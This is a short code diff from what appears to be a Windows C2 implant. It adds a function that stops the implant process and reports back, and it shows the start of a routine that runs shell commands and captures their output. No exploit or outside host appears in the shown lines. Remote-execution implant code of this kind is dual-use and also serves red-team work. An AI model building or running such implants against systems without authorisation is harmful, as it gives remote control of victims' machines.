@@ -1,6 +1,12 @@
 #include <Windows.h>
 
-// Execute shell command and capture output
+// cleanly exit implant process
+void ExitImplantProcess() {
+    SendOutput("[+] Successfully stopped agent process");
+    exit(0);
+}
+
+// execute shell command and capture output
 void ExecuteWindowsShellCommand(const char *cmd) {
     SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
     HANDLE hRead, hWrite;
